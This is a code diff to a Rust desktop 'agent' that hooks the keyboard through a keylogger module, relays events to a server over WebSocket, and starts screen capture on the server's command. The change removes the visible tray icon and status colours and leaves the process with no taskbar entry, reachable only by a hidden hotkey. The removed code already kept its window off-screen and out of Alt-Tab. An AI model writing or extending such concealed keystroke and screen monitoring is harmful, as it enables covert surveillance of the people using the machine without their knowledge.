@@ -5,22 +5,19 @@
 //! ## Startup flow
 //!
 //! 1. The **main thread** loads the saved configuration, spawns a background
-//!    thread that runs a Tokio runtime + the agent WebSocket loop, then calls
-//!    `eframe::run_native` — this takes over the main thread for the GUI/tray.
+//!    thread that runs a Tokio runtime + the agent WebSocket loop, then runs
+//!    an egui/eframe event loop for the settings window (cross-platform).
 //!
 //! 2. The **background thread** installs the keyboard hook, then runs the
 //!    reconnect loop.  Any time the user changes the server URL or agent name
 //!    through the settings window, the new `Config` is sent over a
 //!    `tokio::sync::watch` channel and the loop reconnects immediately.
 //!
-//! ## Tray icon
+//! ## Settings window
 //!
-//! A system-tray icon is shown in the Windows notification area.
-//! - Left-click or "Settings" from the right-click menu → password prompt
-//!   → settings window.
-//! - Icon colour reflects connection status (green / yellow / red).
-//! - The ✕ button hides the window instead of closing the process.
-//! - "Exit" in the tray menu cleanly terminates the process.
+//! The process has no taskbar entry.  Press **Ctrl+Shift+F12** to open the
+//! settings window.  The ✖ Close button hides the window; only "Exit Agent"
+//! terminates the process.
 //!
 //! ## Outbound frames (agent → server)
 //!
@@ -60,7 +57,6 @@ use std::sync::{
 use std::time::Duration;
 
 use anyhow::{Context, Result};
-use eframe::egui;
 use futures_util::{SinkExt, StreamExt};
 use input::InputController;
 use keylogger::InputEvent;
@@ -170,33 +166,8 @@ fn main() {
         Err(_)     => warn!("Agent thread exited before keylogger was ready"),
     }
 
-    // ── eframe window (main thread — required by winit / Win32) ──────────
-    //
-    // We start the window far off-screen so it is invisible before the first
-    // update() call.  We do NOT use with_visible(false) because that causes
-    // eframe to suspend the render loop, which means tray events can never be
-    // processed.  WS_EX_TOOLWINDOW (applied inside AgentApp::new via the raw
-    // window handle) prevents the window from appearing in the taskbar or
-    // Alt-Tab switcher.
-    let native_options = eframe::NativeOptions {
-        viewport: egui::ViewportBuilder::default()
-            .with_title("Agent Settings")
-            .with_inner_size([520.0, 430.0])
-            .with_position(egui::pos2(-32000.0, -32000.0)) // off-screen until first show
-            .with_taskbar(false)   // hide from taskbar & Alt-Tab
-            .with_resizable(false)
-            .with_maximize_button(false)
-            .with_minimize_button(false),
-        ..Default::default()
-    };
-
-    let _ = eframe::run_native(
-        "Agent Settings",
-        native_options,
-        Box::new(move |cc| {
-            Ok(Box::new(ui::AgentApp::new(cc, initial_config, config_tx, agent_status)))
-        }),
-    );
+    // ── egui settings window (main thread; eframe owns the event loop) ───
+    let _ = ui::AgentApp::new(initial_config, config_tx, agent_status).run();
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -259,6 +230,15 @@ async fn run_agent_loop(
                             Ok(())  => info!("Session closed gracefully."),
                             Err(e)  => error!("Session error: {e:#}"),
                         }
+
+                        // Stop the capture thread on every session end so it
+                        // never bleeds into the next reconnect without an
+                        // explicit start_capture from the server.
+                        if let Some(stop) = capture_stop.take() {
+                            stop.store(true, Ordering::Relaxed);
+                            info!("Screen capture stopped (session ended).");
+                        }
+
                         set_status(&status, AgentStatus::Disconnected);
                     }
                     Err(e) => {
